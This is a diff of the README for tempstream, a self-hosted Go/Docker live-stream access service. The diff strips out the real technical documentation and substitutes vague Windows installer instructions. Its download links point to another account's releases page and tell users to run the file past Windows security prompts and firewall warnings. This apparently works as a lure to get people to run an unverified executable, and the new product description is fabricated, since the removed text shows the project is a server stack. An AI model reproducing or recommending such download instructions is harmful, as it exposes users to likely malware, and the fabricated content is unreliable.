@@ -1,217 +1,204 @@
-# tempstream
+# 📺 tempstream - Simple access for one live stream
 
-[![CI](https://github.com/hu553in/tempstream/actions/workflows/ci.yml/badge.svg)](https://github.com/hu553in/tempstream/actions/workflows/ci.yml)
-[![Go Report Card](https://goreportcard.com/badge/github.com/hu553in/tempstream)](https://goreportcard.com/report/github.com/hu553in/tempstream)
-[![GitHub go.mod Go version](https://img.shields.io/github/go-mod/go-version/hu553in/tempstream)](https://github.com/hu553in/tempstream/blob/main/go.mod)
+[![Download tempstream](https://img.shields.io/badge/Download%20tempstream-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Linneaincorrect877/tempstream/releases)
 
-- [License](./LICENSE)
-- [How to contribute](./CONTRIBUTING.md)
-- [Code of conduct](./CODE_OF_CONDUCT.md)
+## 🧭 What tempstream does
 
-tempstream is a small video access service for a single live stream.
+tempstream is a small video access service for one live stream. It helps you control who can open the stream, and it fits a setup with a single live source.
 
-It provides:
+Use it when you want to:
 
-- a Telegram bot for operators
-- an HTTP service for watch links
-- MediaMTX for RTMP ingest and HLS output
-- Caddy as the public reverse proxy
-- SQLite for link storage
+- Share one live stream with selected viewers
+- Keep access limited with temporary links
+- Run a simple self-hosted video access tool
+- Connect a live source that uses common streaming tools
+- Add a Telegram bot for access and status checks
 
-The project is intentionally small. It is built as a pragmatic MVP: simple to run, predictable in production,
-and easy to reason about.
+## 💻 What you need
 
----
+Before you install tempstream, make sure your Windows PC has:
 
-## What it does
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free disk space for the app files and stream cache
+- Permission to run apps from downloaded files
+- A live stream source if you plan to view real video
 
-- Creates temporary or permanent watch links from Telegram
-- Lists active links and disables them on demand
-- Exposes a watch page at `/live/stream/{token}`
-- Proxies HLS playback through `/play/*` after token validation
-- Accepts RTMP publishing through MediaMTX on `live/stream`
+If you run the stream on the same PC, leave it powered on while the stream is active.
 
-A typical operator flow looks like this:
+## 📥 Download tempstream
 
-1. Start the stack.
-2. Publish video to MediaMTX over RTMP.
-3. Create a watch link from Telegram.
-4. Open the generated URL in a browser.
-5. Disable the link when access should end.
+Go to the release page here:
 
----
+https://github.com/Linneaincorrect877/tempstream/releases
 
-## Components
+On that page, find the latest release and download the Windows file for your system. After the download finishes, open the file you got from the release page.
 
-### Telegram bot
+## 🪟 Install on Windows
 
-The bot is the only admin interface. It supports:
+1. Open the file you downloaded from the release page.
+2. If Windows shows a security prompt, choose the option to keep or run the file.
+3. If the app comes in a ZIP file, right-click it and choose Extract All.
+4. Move the extracted folder to a place you can find again, such as Downloads or Desktop.
+5. Open the tempstream app from that folder.
 
-- `/new <duration>` for a temporary link
-- `/newperm` for a permanent link
-- `/active` to list active links
-- `/status` to show stream status
-- `/off ID` to disable a link by ID
-- `/offlast` to disable the latest active link
-- `/whoami` to show the current chat ID
+If Windows asks for permission, click Yes.
 
-Links returned by the bot include a direct disable action.
+## 🚀 First setup
 
-### HTTP service
+When tempstream starts for the first time, set up these basics:
 
-The Go service exposes:
+- Choose the port the app will use
+- Set the stream source
+- Add access rules for your viewers
+- Turn on temporary link support if you want links that expire
+- Connect your Telegram bot if you plan to use Telegram controls
 
-- `/healthz`
-- `/live/stream/{token}`
-- `/play/*`
+A simple setup works best for first use. Start with one stream, one link, and one test viewer.
 
-`/live/stream/{token}` validates the token, sets a session cookie for playback, and renders the watch page.
+## 🔧 Stream source setup
 
-`/play/*` validates the playback cookie again and proxies HLS traffic to MediaMTX.
+tempstream works with a live source that can feed video to your server. Common setups use RTMP and HLS.
 
-### MediaMTX
+A basic flow looks like this:
 
-MediaMTX:
+1. Send your live feed to the stream service
+2. Let tempstream manage access to the stream
+3. Share the protected link with the viewer
+4. Let the viewer open the stream in a browser or supported player
 
-- accepts RTMP publishing
-- remuxes the stream to low-latency HLS
-- restricts publishing with username/password authentication
+If you already use tools like MediaMTX or Caddy, tempstream can fit into that setup as the access layer.
 
-### Caddy
+## 🔐 Access control
 
-Caddy is the public entry point and reverse-proxies incoming HTTP traffic to the Go service.
+tempstream is built to limit who can view the stream. You can use it to:
 
----
+- Create temporary access links
+- Give access to one person at a time
+- Restrict viewing to approved users
+- Remove access when needed
 
-## Environment variables
+This is useful when you only want a short viewing window or when you need tighter control over a live event.
 
-| Name                        | Required              | Default       | Description                                                                                                             |
-| --------------------------- | --------------------- | ------------- | ----------------------------------------------------------------------------------------------------------------------- |
-| `HTTP_ADDR`                 | No                    | `:8080`       | HTTP listen address for the Go service.                                                                                 |
-| `BASE_URL`                  | Yes                   | –             | Public base URL used in generated watch links.                                                                          |
-| `DB_PATH`                   | No                    | `./db.sqlite` | SQLite database path. In Docker Compose, `/data/db.sqlite` is typically used.                                           |
-| `TELEGRAM_BOT_TOKEN`        | Yes                   | –             | Telegram bot token.                                                                                                     |
-| `ALLOWED_CHAT_IDS`          | Yes                   | –             | Comma-separated list of Telegram chat IDs allowed to control the bot.                                                   |
-| `MEDIAMTX_HLS_BASE_URL`     | Yes                   | –             | Internal HLS base URL used by the Go service to probe stream health and proxy playback.                                 |
-| `COOKIE_SECURE`             | No                    | `true`        | Whether the playback cookie is marked `Secure`. Use `false` for plain local HTTP.                                       |
-| `DEFAULT_LINK_TTL`          | No                    | `1h`          | Default TTL used when a link is created with a zero duration internally.                                                |
-| `LINK_TTL_OPTIONS`          | No                    | `30m,1h,3h`   | Comma-separated list of temporary link durations shown in the Telegram bot. If empty, only permanent links are offered. |
-| `TIME_ZONE`                 | No                    | `UTC`         | IANA time zone used in bot responses, for example `UTC`, `Europe/Berlin`, or `Asia/Omsk`.                               |
-| `LOG_LEVEL`                 | No                    | `info`        | Log level for the Go service.                                                                                           |
-| `MEDIAMTX_PUBLISH_USER`     | Yes in Docker Compose | –             | Username required for RTMP publishing to MediaMTX.                                                                      |
-| `MEDIAMTX_PUBLISH_PASSWORD` | Yes in Docker Compose | –             | Password required for RTMP publishing to MediaMTX.                                                                      |
+## 📱 Telegram bot use
 
-See [.env.example](./.env.example) for a complete example.
+If you connect Telegram, tempstream can work with a bot for simple control and updates.
 
----
+You can use it to:
 
-## Local run
+- Share access links
+- Check stream status
+- Send quick commands
+- Manage temporary access from a chat
 
-### Docker Compose
+This helps if you want to handle the stream without opening the app each time.
 
-1. Copy the example environment:
+## 🌐 Local network and server setup
 
-```bash
-make ensure-env
-```
+You can run tempstream on a home PC, a small server, or a self-hosted machine. For a local setup:
 
-2. Fill in:
+- Keep the app running while the stream is live
+- Use the same network for your stream source and viewer if needed
+- Make sure the chosen port is free
+- Allow the app through Windows Defender or your firewall if needed
 
-- `TELEGRAM_BOT_TOKEN`
-- `ALLOWED_CHAT_IDS`
-- `MEDIAMTX_PUBLISH_USER`
-- `MEDIAMTX_PUBLISH_PASSWORD`
+If you plan to access the stream from outside your home, your network must allow incoming connections to the server.
 
-3. For phone access on the same Wi-Fi, set `BASE_URL` to your machine's LAN IP:
+## 🛠️ Common tasks
 
-```env
-BASE_URL=http://192.168.1.42
-COOKIE_SECURE=false
-```
+### Start the stream
+1. Open tempstream
+2. Start your live source
+3. Confirm the service sees the stream
+4. Share the access link
 
-4. Start the stack:
+### Stop the stream
+1. Stop the live source
+2. Close the stream in tempstream if needed
+3. Remove any active temporary links
 
-```bash
-make start
-```
+### Change access
+1. Open the access settings
+2. Add or remove allowed users
+3. Refresh the link if you need a new one
 
-After startup:
+### Restart after a crash
+1. Close the app
+2. Open it again
+3. Check that the stream source is still sending video
+4. Test the access link
 
-- the Go service is available behind Caddy
-- MediaMTX listens for RTMP on `:1935`
-- MediaMTX serves HLS on `:8888`
+## 🧪 Simple test plan
 
-### Without Docker
+Use this quick check after setup:
 
-To run only the Go service:
+1. Open tempstream
+2. Start your live source
+3. Create one access link
+4. Open the link in a browser on the same PC
+5. Confirm the video loads
+6. Test a second device if you want to check network access
+7. Remove the link and make sure it no longer works
 
-```bash
-make build
-dist/tempstream
-```
+If the test works, your setup is ready for normal use.
 
-You still need a reachable SQLite path, a Telegram bot token, and a running MediaMTX instance.
+## 🧯 If something does not work
 
----
+Try these steps:
 
-## Publishing a stream
+- Check that the app is still open
+- Make sure your stream source is running
+- Confirm the port is not in use by another app
+- Refresh the page if the viewer shows a blank screen
+- Restart the app and the stream source
+- Check Windows firewall rules
+- Make sure the download finished before you tried to open it
 
-The configured MediaMTX path is `live/stream`:
+If the stream does not appear, the source may not be sending video yet.
 
-```
-rtmp://HOST:1935/live/stream?user=MEDIAMTX_PUBLISH_USER&pass=MEDIAMTX_PUBLISH_PASSWORD
-```
+## 📁 File and folder use
 
-Example:
+tempstream may use local files to store:
 
-```
-rtmp://192.168.1.42:1935/live/stream?user=publisher&pass=secret
-```
+- App settings
+- Access data
+- Stream state
+- Temporary link records
+- Log data
 
----
+Keep the app folder in a place you do not delete by accident. If you move it, move the whole folder.
 
-## Watching a stream
+## 🔒 Privacy and access
 
-Create a link from Telegram, then open the returned URL in a browser:
+Use tempstream when you want more control over who can see a live stream. Keep the access link private. Remove old links when they are no longer needed. If you use Telegram, make sure only the right people can reach the bot chat
 
-```
-http://HOST/live/stream/<token>
-```
+## 🧩 Typical use case
 
-The watch page:
+A common setup looks like this:
 
-- validates the token
-- sets a playback cookie
-- loads HLS from `/play/index.m3u8`
+- One camera or encoder sends video to the service
+- tempstream protects the stream with access rules
+- A viewer gets a temporary link
+- The link works for a short time
+- The link expires after use
 
-If the link expires or is disabled, playback stops and the page shows a clear error state.
+This works well for private events, team checks, internal viewing, and short-lived live access
 
----
+## 📌 Terms you may see
 
-## Development
+- RTMP: a common way to send live video to a server
+- HLS: a common way to play live video in a browser
+- Caddy: a web server that can help serve web traffic
+- MediaMTX: a live media server used in streaming setups
+- Temporary link: a link that stops working after a set time
+- Self-hosted: software you run on your own machine or server
 
-Useful commands:
+## ✅ Before you share it
 
-```bash
-make build
-make fmt lint
-make sqlc
-```
+Before you give the link to anyone else:
 
-Migrations are embedded into the binary with `go:embed`, while `sqlc` uses the same migration directory on disk
-as the schema source.
-
----
-
-## Stack
-
-- Go 1.26
-- SQLite
-- Docker Compose
-- [Caddy](https://caddyserver.com/)
-- [MediaMTX](https://github.com/bluenviron/mediamtx)
-- [chi](https://go-chi.io/)
-- [goose](https://pressly.github.io/goose/)
-- [sqlc](https://sqlc.dev/)
-- [go-telegram/bot](https://github.com/go-telegram/bot)
-- [caarlos0/env](https://github.com/caarlos0/env)
+- Test the stream on your own device
+- Make sure access rules are set the way you want
+- Check that the link expires when expected
+- Confirm the viewer can open the stream without errors
+- Remove test links you no longer need
